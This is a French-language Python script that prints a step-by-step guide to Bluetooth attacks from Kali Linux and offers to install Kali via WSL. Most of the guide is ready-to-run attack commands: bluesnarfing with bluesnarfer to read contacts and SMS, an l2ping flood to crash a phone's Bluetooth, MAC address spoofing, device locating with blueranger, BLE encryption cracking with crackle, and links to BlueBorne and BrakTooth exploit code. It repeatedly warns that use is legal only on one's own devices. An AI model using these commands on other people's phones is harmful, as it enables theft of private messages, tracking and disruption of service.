#!/usr/bin/env python3
"""
🔵 GUIDE ATTAQUES BLUETOOTH RÉELLES
Comment faire de VRAIES attaques sur TON téléphone avec Kali Linux

⚠️ LÉGAL UNIQUEMENT SUR VOS PROPRES APPAREILS !
"""

import os
import subprocess
import webbrowser

class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'
    B = '\033[94m'; M = '\033[95m'; C = '\033[96m'
    W = '\033[97m'; X = '\033[0m'; BOLD = '\033[1m'

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def main_guide():
    clear()
    print(f"""
{C.R}{C.BOLD}
╔═══════════════════════════════════════════════════════════════╗
║     🔵 ATTAQUES BLUETOOTH RÉELLES - GUIDE COMPLET 🔵          ║
╠═══════════════════════════════════════════════════════════════╣
║  Comment VRAIMENT hacker un téléphone via Bluetooth           ║
║  (Le vôtre uniquement - à but éducatif)                       ║
╚═══════════════════════════════════════════════════════════════╝
{C.X}

{C.Y}⚠️ POURQUOI ÇA NE MARCHE PAS SUR WINDOWS ?{C.X}

Windows bloque l'accès bas niveau au Bluetooth.
Pour de VRAIES attaques, il faut {C.G}KALI LINUX{C.X}.

═══════════════════════════════════════════════════════════════
                    ÉTAPE 1 : INSTALLER KALI LINUX
═══════════════════════════════════════════════════════════════

{C.C}Option A - Machine Virtuelle (Recommandé pour débuter){C.X}

1. Télécharge VirtualBox : https://www.virtualbox.org/
2. Télécharge Kali Linux VM : https://www.kali.org/get-kali/#kali-virtual-machines
3. Importe le fichier .ova dans VirtualBox
4. Lance la VM (user: kali, pass: kali)

{C.C}Option B - WSL2 (Windows Subsystem for Linux){C.X}

PowerShell (Admin):
  wsl --install -d kali-linux

{C.C}Option C - Live USB (Pour adaptateur BT USB){C.X}

1. Télécharge Kali ISO : https://www.kali.org/get-kali/
2. Utilise Rufus pour créer une clé bootable
3. Démarre sur la clé USB

═══════════════════════════════════════════════════════════════
                    ÉTAPE 2 : CONFIGURER BLUETOOTH
═══════════════════════════════════════════════════════════════

{C.Y}Dans Kali Linux, ouvre un terminal :{C.X}

# Installer les outils Bluetooth
{C.G}sudo apt update
sudo apt install -y bluez bluez-tools btscanner redfang spooftooph{C.X}

# Vérifier l'adaptateur Bluetooth
{C.G}hciconfig{C.X}

# Activer l'adaptateur
{C.G}sudo hciconfig hci0 up{C.X}

# Mettre en mode scan
{C.G}sudo hciconfig hci0 piscan{C.X}

═══════════════════════════════════════════════════════════════
                    ÉTAPE 3 : COMMANDES D'ATTAQUE RÉELLES
═══════════════════════════════════════════════════════════════

{C.R}⚠️ UNIQUEMENT SUR VOTRE PROPRE TÉLÉPHONE !{C.X}

{C.BOLD}--- SCAN DES APPAREILS ---{C.X}

# Scanner les appareils Bluetooth à proximité
{C.G}sudo hcitool scan{C.X}

# Scan détaillé avec infos
{C.G}sudo hcitool inq{C.X}

# Scanner avec btscanner (interface graphique)
{C.G}sudo btscanner{C.X}

{C.BOLD}--- RÉCUPÉRER L'ADRESSE MAC DE VOTRE TÉLÉPHONE ---{C.X}

# Le scan affichera quelque chose comme :
# XX:XX:XX:XX:XX:XX   Mon_Telephone

# Notez cette adresse MAC pour les tests suivants

{C.BOLD}--- TEST DE CONNECTIVITÉ (L2PING) ---{C.X}

# Ping Bluetooth (comme ping réseau)
{C.G}sudo l2ping XX:XX:XX:XX:XX:XX{C.X}

# Si répond = appareil accessible

{C.BOLD}--- DÉCOUVERTE DES SERVICES (SDP) ---{C.X}

# Lister les services exposés par votre téléphone
{C.G}sdptool browse XX:XX:XX:XX:XX:XX{C.X}

# Cela montre : OBEX, Audio, Serial Port, etc.

{C.BOLD}--- ATTAQUE BLUEJACKING (Envoi de message) ---{C.X}

# Créer un fichier vCard
{C.G}echo 'BEGIN:VCARD
VERSION:2.1
N:TEST;SECURITE
FN:Test Sécurité
NOTE:Votre Bluetooth est vulnérable!
END:VCARD' > test.vcf{C.X}

# Envoyer via OBEX Push
{C.G}obexftp -b XX:XX:XX:XX:XX:XX -p test.vcf{C.X}

# Ou avec ussp-push
{C.G}sudo apt install ussp-push
ussp-push XX:XX:XX:XX:XX:XX test.vcf{C.X}

{C.BOLD}--- ATTAQUE BLUESNARFING (Extraction de données) ---{C.X}

{C.R}⚠️ ILLÉGAL sur un appareil qui n'est pas le vôtre !{C.X}

# Installer bluesnarfer
{C.G}sudo apt install bluesnarfer{C.X}

# Lister le répertoire téléphonique
{C.G}bluesnarfer -b XX:XX:XX:XX:XX:XX -r 1-100{C.X}

# Options:
#   -r : lire les contacts (1-100 = entrées 1 à 100)
#   -w : écrire
#   -s : lire SMS
#   -c : passer un appel

# Exemple: lire les SMS
{C.G}bluesnarfer -b XX:XX:XX:XX:XX:XX -s{C.X}

{C.BOLD}--- ATTAQUE DOS (Denial of Service) ---{C.X}

# Flood de requêtes L2CAP
{C.G}sudo l2ping -i hci0 -s 600 -f XX:XX:XX:XX:XX:XX{C.X}

# Cela peut faire planter le Bluetooth de votre téléphone

{C.BOLD}--- SPOOFING D'ADRESSE MAC ---{C.X}

# Changer l'adresse MAC de votre adaptateur
{C.G}sudo bdaddr -i hci0 XX:XX:XX:XX:XX:XX{C.X}

# Ou avec spooftooph
{C.G}sudo spooftooph -i hci0 -a XX:XX:XX:XX:XX:XX{C.X}

═══════════════════════════════════════════════════════════════
                    ÉTAPE 4 : OUTILS AVANCÉS
═══════════════════════════════════════════════════════════════

{C.BOLD}BlueMaho - Framework complet{C.X}
{C.G}git clone https://github.com/zenware/bluemaho
cd bluemaho
python bluemaho.py{C.X}

{C.BOLD}Blueranger - Localiser un appareil{C.X}
{C.G}sudo apt install blueranger
blueranger XX:XX:XX:XX:XX:XX{C.X}

{C.BOLD}Redfang - Trouver appareils cachés{C.X}
{C.G}sudo apt install redfang
redfang -r 00:00:00:00:00:00-FF:FF:FF:FF:FF:FF{C.X}

{C.BOLD}Crackle - Casser le chiffrement BLE{C.X}
{C.G}sudo apt install crackle
crackle -i capture.pcap -o decrypted.pcap{C.X}

═══════════════════════════════════════════════════════════════
                    ÉTAPE 5 : EXPLOITS CONNUS
═══════════════════════════════════════════════════════════════

{C.BOLD}BlueBorne (CVE-2017-0781){C.X}
Framework: https://github.com/ArmisSecurity/blueborne

{C.BOLD}KNOB Attack{C.X}
Paper: https://knobattack.com/

{C.BOLD}BrakTooth{C.X}
https://github.com/Matheus-Garbelini/braktooth_esp32_bluetooth_classic_attacks

═══════════════════════════════════════════════════════════════
                    MATÉRIEL RECOMMANDÉ
═══════════════════════════════════════════════════════════════

{C.C}Adaptateurs USB Bluetooth compatibles Kali :{C.X}

1. {C.G}Parani UD100{C.X} - Excellente portée (300m)
2. {C.G}Sena UD100{C.X} - Classe 1, longue portée
3. {C.G}TP-Link UB400{C.X} - Basique mais fonctionne
4. {C.G}ASUS USB-BT400{C.X} - Compact et compatible

{C.Y}Note: L'adaptateur intégré du PC ne fonctionne souvent pas bien.
Un adaptateur USB externe est recommandé.{C.X}

═══════════════════════════════════════════════════════════════
{C.R}                    ⚠️ RAPPEL LÉGAL ⚠️{C.X}
═══════════════════════════════════════════════════════════════

{C.R}TOUTES ces techniques sont ILLÉGALES si utilisées sur des
appareils qui ne vous appartiennent pas !{C.X}

{C.G}Usage autorisé :{C.X}
  ✓ Votre propre téléphone
  ✓ Appareils dont vous avez l'autorisation écrite
  ✓ Environnements de lab (CTF, HackTheBox, etc.)

{C.R}Peines encourues (France) :{C.X}
  • Jusqu'à 2 ans de prison
  • 60 000€ d'amende
  • Aggravé si données personnelles

""")

def install_wsl_kali():
    """Installer Kali Linux via WSL"""
    print(f"\n{C.C}═══ INSTALLATION DE KALI LINUX (WSL) ═══{C.X}\n")
    
    print(f"{C.Y}[*] Cette opération nécessite les droits administrateur{C.X}\n")
    
    confirm = input(f"{C.C}Voulez-vous installer Kali Linux via WSL ? (o/n) : {C.X}").strip().lower()
    
    if confirm == 'o':
        print(f"\n{C.G}[+] Installation en cours...{C.X}\n")
        try:
            # Activer WSL
            subprocess.run([
                'powershell', '-Command', 
                'Start-Process powershell -Verb runAs -ArgumentList "wsl --install -d kali-linux"'
            ], shell=True)
            
            print(f"""
{C.G}[+] Installation lancée !{C.X}

{C.Y}Après l'installation :{C.X}
1. Redémarrez votre PC
2. Kali Linux se configurera au premier démarrage
3. Créez un utilisateur et mot de passe
4. Lancez 'kali' depuis le menu Démarrer

{C.C}Pour utiliser le Bluetooth dans WSL, vous aurez besoin
d'un adaptateur USB Bluetooth et de configurer USB passthrough.{C.X}
""")
        except Exception as e:
            print(f"{C.R}[!] Erreur: {e}{C.X}")
    else:
        print(f"{C.Y}[*] Installation annulée{C.X}")

def open_kali_download():
    """Ouvrir la page de téléchargement Kali"""
    print(f"\n{C.C}[*] Ouverture de la page de téléchargement Kali Linux...{C.X}")
    webbrowser.open('https://www.kali.org/get-kali/#kali-virtual-machines')

def menu():
    while True:
        clear()
        print(f"""
{C.C}{C.BOLD}
╔═══════════════════════════════════════════════════════════════╗
║         🔵 BLUETOOTH HACKING - OUTILS RÉELS 🔵                ║
╚═══════════════════════════════════════════════════════════════╝
{C.X}

  {C.C}[1]{C.X}  📖 Voir le guide complet (commandes réelles)
  {C.C}[2]{C.X}  💿 Installer Kali Linux (WSL)
  {C.C}[3]{C.X}  🌐 Télécharger Kali Linux VM
  {C.C}[4]{C.X}  📺 Tutoriel vidéo (YouTube)
  
  {C.R}[0]{C.X}  Quitter

""")
        choice = input(f"{C.C}Choix : {C.X}").strip()
        
        if choice == '1':
            main_guide()
            input(f"\n{C.C}Appuyez sur Entrée...{C.X}")
        elif choice == '2':
            install_wsl_kali()
            input(f"\n{C.C}Appuyez sur Entrée...{C.X}")
        elif choice == '3':
            open_kali_download()
            input(f"\n{C.C}Appuyez sur Entrée...{C.X}")
        elif choice == '4':
            webbrowser.open('https://www.youtube.com/results?search_query=bluetooth+hacking+kali+linux+tutorial')
            input(f"\n{C.C}Appuyez sur Entrée...{C.X}")
        elif choice == '0':
            break

if __name__ == "__main__":
    menu()
